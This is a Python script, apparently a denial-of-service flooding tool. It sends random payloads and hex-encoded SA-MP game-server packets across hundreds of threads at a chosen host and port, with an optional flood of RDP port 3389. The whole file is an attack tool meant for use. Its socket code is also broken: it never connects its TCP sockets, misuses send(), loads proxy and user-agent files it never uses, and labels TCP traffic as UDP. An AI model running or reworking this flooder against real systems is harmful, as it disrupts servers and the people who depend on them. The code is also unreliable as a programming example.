import socket, struct, codecs, sys, threading, random, time, os, argparse

proxys = open('proxy.txt').readlines()
bots = len(proxys)
iyos = open('ua.txt').readlines()
uambot = len(iyos)


# // Argparse
ap = argparse.ArgumentParser()

ap.add_argument("-i", "--ip", required=True, type=str, help="Host or ip")

ap.add_argument("-p", "--port", required=True, type=int, help="Port")

ap.add_argument("-t", "--times", type=int, default=1000, help="Packets per one connection")

ap.add_argument("-th", "--threads", type=int, default=450, help="Threads")

ap.add_argument("-c", "--choice", type=str, default="n", help="With attack rdp (y/n)")

args = vars(ap.parse_args())



ip = args['ip']

port = args['port']

times = args['times']

threads = args['threads']

choice = args['choice']



# // Convert domain to ip.

host = socket.gethostbyname(ip)

os.system('cls' if os.name == 'nt' else 'clear')


# // SampPackets ( UDP )

def sampdos(host, port, times):

        Attack = [

        codecs.decode('53414d5090d91d4d611e700a465b00', 'hex_codec'),

        codecs.decode('53414d509538e1a9611e63', 'hex_codec'),

        codecs.decode('53414d509538e1a9611e69', 'hex_codec'),

        codecs.decode('53414d509538e1a9611e72', 'hex_codec'),

        codecs.decode('081e62da', 'hex_codec'),

        codecs.decode('081e77da', 'hex_codec'),

        codecs.decode('081e4dda', 'hex_codec'),

        codecs.decode('021efd40', 'hex_codec'),

        codecs.decode('081e7eda', 'hex_codec')]

        timeout = time.time() + float(times)

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        while time.time() < timeout:

                packets = random._urandom(1021)

                packet = random._urandom(1490)

                pack = random._urandom(666)

                msg = Attack[random.randrange(0,3)]

                sock.send(pack, (host, int(port)))

                sock.send(packet, (host, int(port)))

                sock.send(msg, (host, int(port)))

                sock.send(packets, (host, int(port)))

                if int(port) == 443:

                        sock.send(Attack[5], (host, int(port)))

                elif int(port) == 22:

                        sock.send(Attack[4], (host, int(port)))

                elif int(port) == 80:

                        sock.send(Attack[6], (host, int(port)))

                



def randsender(host, port, times):

        timeout = time.time() + float(times)

        sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM,socket.IPPROTO_TCP)

        punch = random._urandom(int(1024))

        while time.time() < timeout:

                sock.send(punch, (host, int(port)))

                sock.send(punch, (host, int(port)))

                sock.send(punch, (host, int(port)))





def stdsender(host, times):

        timeout = time.time() + float(times)

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        payload = b'\x00\x00\x00\x00\x00\x00\x00\xff\x00\x00\x00\x00\x00\x00\x00\x00'
     

        port = '3389'

        while time.time() < timeout:

                sock.send(payload, (host, int(port)))

                sock.send(payload, (host, int(port)))

                sock.send(payload, (host, int(port)))





for y in range(threads):

        if choice == 'y':

                threading.Thread(target=sampdos, args=(host, port, times)).start()

                threading.Thread(target=randsender, args=(host, port, times)).start()

                threading.Thread(target=stdsender, args=(host, times)).start()

        else:

                threading.Thread(target=sampdos, args=(host, port, times)).start()

                threading.Thread(target=randsender, args=(host, port, times)).start()
